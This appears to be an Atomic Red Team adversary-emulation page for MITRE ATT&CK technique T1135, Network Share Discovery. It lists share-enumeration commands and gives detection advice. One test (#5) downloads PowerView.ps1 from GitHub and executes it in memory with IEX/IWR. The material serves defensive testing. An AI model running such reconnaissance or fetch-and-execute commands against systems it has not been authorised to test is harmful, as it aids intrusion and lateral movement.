# T1135 - Network Share Discovery
Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. 

File sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the <code>net view \\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>.

Cloud virtual networks may contain remote network shares or file storage services accessible to an adversary after they have obtained access to a system. For example, AWS, GCP, and Azure support creation of Network File System (NFS) shares and Server Message Block (SMB) shares that may be mapped on endpoint or cloud-based systems.(Citation: Amazon Creating an NFS File Share)(Citation: Google File servers on Compute Engine)

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Network Share Discovery
Network Share Discovery

**Supported Platforms:** macos, linux
#### Attack Commands: Run with `sh`
```sh
df -aH
smbutil view -g //#{computer_name}
showmount #{computer_name}
```

Invoke-AtomicTest T1135 -TestNumbers 1

### Atomic Test #2 - Network Share Discovery command prompt
Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host
Upon execution avalaible network shares will be displayed in the powershell session

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
net view \\#{computer_name}
```

Invoke-AtomicTest T1135 -TestNumbers 2

### Atomic Test #3 - Network Share Discovery PowerShell
Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host
Upon execution, avalaible network shares will be displayed in the powershell session

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
net view \\#{computer_name}
get-smbshare -Name #{computer_name}
```

Invoke-AtomicTest T1135 -TestNumbers 3

### Atomic Test #4 - View available share drives
View information about all of the resources that are shared on the local computer Upon execution, avalaible share drives will be displayed in the powershell session
**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
net share
```

Invoke-AtomicTest T1135 -TestNumbers 4

### Atomic Test #5 - Share Discovery with PowerView
Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Find-DomainShare -CheckShareAccess -Verbose
```

Invoke-AtomicTest T1135 -TestNumbers 5

## Detection
System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Normal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

In cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be sufficient due to benign use during normal operations.